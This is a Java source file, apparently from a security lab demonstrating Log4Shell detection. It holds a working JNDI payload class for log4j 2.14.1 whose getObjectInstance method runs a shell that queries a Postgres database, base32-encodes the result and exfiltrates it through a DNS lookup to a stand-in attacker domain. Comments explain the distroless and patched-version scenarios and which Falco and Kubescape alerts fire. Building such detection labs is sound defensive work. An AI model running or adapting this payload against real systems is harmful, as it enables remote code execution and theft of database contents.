// Loaded by chain-backend's JNDI-vulnerable log4j call.
//
// log4j 2.14.1's JndiManager.lookup() casts the loaded class to
// javax.naming.spi.ObjectFactory. A plain class with only a static
// initializer doesn't pass this cast — JNDI loads the bytecode but never
// initializes the class (lazy init), so the static block never fires.
// Implementing ObjectFactory + putting the work in getObjectInstance is
// what the original 2021 demonstrators did.
//
// Scenario A: Runtime.exec("/bin/sh", ...) succeeds. The shell runs psql,
//             base32-encodes the row, and calls getent so node-agent observes
//             a DNS query with the encoded payload in the label.
// Scenario B: identical bytecode runs in JVM. Runtime.exec("/bin/sh") throws
//             IOException — distroless has no /bin/sh. Falco surfaces the
//             failed execve(ENOENT).
// Scenario C: never loaded — log4j 2.17.1 does not perform JNDI substitution.

import java.io.IOException;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class Payload implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) {
        System.err.println("Payload.getObjectInstance ENTERED");
        // Single-line shell to keep escaping clean. The pipeline:
        //   1. psql query returns a postgres row
        //   2. base32 encode + strip padding + flatten
        //   3. getent emits a DNS query whose label carries the encoded row
        String cmd = "set +e; "
            + "ROW=$(psql -h chain-postgres -U postgres -At "
            + "-c 'SELECT current_database() || chr(58) || current_user' 2>&1); "
            + "ENC=$(printf '%s' \"$ROW\" | base32 | tr -d '=' | tr -d '\\n' | cut -c1-40); "
            + "getent hosts \"${ENC}.exfil.attacker.example.com\" >/dev/null 2>&1; "
            + "echo done";

        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            p.waitFor();
        } catch (IOException e) {
            // Distroless backend lands here: /bin/sh missing → ENOENT.
            // Kubescape's R1100 (failed execve ENOENT) fires on the syscall side.
            System.err.println("exec_failed: " + e.getMessage());
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
        return null;
    }
}
